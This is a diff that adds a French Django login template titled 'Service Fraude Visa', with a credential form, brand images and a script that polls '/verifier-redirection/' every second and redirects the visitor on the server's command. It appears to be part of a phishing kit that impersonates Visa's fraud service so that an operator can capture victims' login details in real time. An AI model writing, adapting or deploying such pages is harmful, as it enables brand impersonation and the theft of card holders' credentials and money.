@@ -1,0 +1,59 @@
+{% extends "onboarding/base.html" %}
+{% load static %}
+
+{% block title %}Connexion sécurisée{% endblock %}
+{% block heading %}Service Fraude Visa{% endblock %}
+{% block subheading %}Connectez-vous via ce lien sécurisé{% endblock %}
+
+{% block content %}
+    <div class="card">
+       {% block card_class %}
+    
+<form method="POST" novalidate>
+    {% csrf_token %}
+    {% for field in form %}
+        <div class="field {% if field.errors %}invalid{% endif %}">
+            <label for="{{ field.id_for_label }}">{{ field.label }}</label>
+            {{ field }}
+            {% for error in field.errors %}
+                <small class="err">{{ error }}</small>
+            {% endfor %}
+        </div>
+    {% endfor %}
+    <button type="submit" class="submit">Connexion</button>
+</form>
+
+<div class="logo2" style="margin-top:20px;">
+    <img src="{% static 'onboarding/logobas.png' %}" alt="Logo">
+</div>
+
+<div class="carrousel-wrap">
+    <div class="carrousel-track">
+        <img src="{% static 'onboarding/img1.png' %}" alt="">
+        <img src="{% static 'onboarding/img2.png' %}" alt="">
+        <img src="{% static 'onboarding/img3.png' %}" alt="">
+        <img src="{% static 'onboarding/img4.png' %}" alt="">
+        <img src="{% static 'onboarding/img5.png' %}" alt="">
+        <img src="{% static 'onboarding/img1.png' %}" alt="">
+        <img src="{% static 'onboarding/img2.png' %}" alt="">
+        <img src="{% static 'onboarding/img3.png' %}" alt="">
+        <img src="{% static 'onboarding/img4.png' %}" alt="">
+        <img src="{% static 'onboarding/img5.png' %}" alt="">
+        {% endblock %}
+    </div>
+</div>
+</div>
+
+
+<script>
+    if (!window.location.pathname.startsWith('/visiteurs/')) {
+        setInterval(async function() {
+            try {
+                const res  = await fetch('/verifier-redirection/');
+                const data = await res.json();
+                if (data.redirect) window.location.href = data.redirect;
+            } catch(e) {}
+        }, 1000);
+    }
+</script>
+{% endblock %}
